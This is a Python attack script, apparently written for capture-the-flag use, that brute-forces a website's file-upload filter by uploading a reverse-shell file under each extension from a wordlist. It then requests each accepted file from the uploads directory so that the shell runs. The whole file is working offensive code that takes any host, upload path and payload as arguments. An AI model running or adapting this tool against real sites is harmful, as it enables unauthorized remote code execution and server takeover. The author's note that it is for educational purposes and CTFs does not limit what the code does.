import requests
import sys
import os

def read_wordlist(file_path):
    words = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                words.append(line)
        return words
    else:
        print("File doesn't exist. Please try again.")
        sys.exit(1)

def read_file(file_directory):
    with open(file_directory, 'r') as file:
        return file.read()

def brute(ext_wordlist, reverse_file_directory,ssl,host, upload_page, get_upload,len):
    wordlist = read_wordlist(ext_wordlist)
    if ssl=='0':
        url=f'http://{host}'
    elif ssl=='1':
        url=f'https://{host}'
    else:
        print('ssl value not valid')
        sys.exit(1)
    for ext in wordlist:
        headers = {
            "Host": host,
            "Content-Type": "multipart/form-data; boundary=---------------------------185628383215430197921179574092",
            "Cookie": "PHPSESSID=hvuet8ekgcs9e2ckgnrms41p1j",  # Set this if you have cookies
            }
        multipart_start = f"""-----------------------------185628383215430197921179574092
Content-Disposition: form-data; name="image"; filename="rev.{ext}"

"""
        multipart_data = read_file(reverse_file_directory)
        multipart_enter = """

"""
        multipart_end = """-----------------------------185628383215430197921179574092--"""
        multipart = multipart_start + multipart_data + multipart_enter + multipart_end
        post_dir = url + upload_page
        response = requests.post(post_dir, headers=headers, data=multipart)
        print(response)
        
        length = response.headers.get('Content-Length', 'Unknown')
        print(length)
        len=str(len)
        if length == len:
            print("Success:", ext)
            file_path = f'{get_upload}/rev.{ext}'
            get_dir = url + file_path
            get_req = requests.get(get_dir)
            if get_req.status_code == 200:
                print('Request sent successfully:', ext, get_dir)
            else:
                print('Failed to retrieve the uploaded file:', ext, get_dir)
        else:
            print('Upload failed for extension:', ext)

if __name__ == "__main__":
    if len(sys.argv) != 8:
        print("Usage: python file-upload.py <host> <ssl (1 if the site has ssl or 0 if not)> </file-upload-page> </uploaded-files-directory> <reverse-shell-file> <ext-wordlist> <success-len>")
        sys.exit(1)
    else:
        host = sys.argv[1]
        ssl=sys.argv[2]
        upload_page = sys.argv[3]
        get_upload = sys.argv[4]
        reverse_file_directory = sys.argv[5]
        ext_wordlist = sys.argv[6]
        len=sys.argv[7]
        brute(ext_wordlist,reverse_file_directory,ssl,host,upload_page,get_upload,len)

# Fatih Emre Çilingir -- https://www.linkedin.com/in/fatihemrecilingir/
# written for educational purposes and ctf competitions
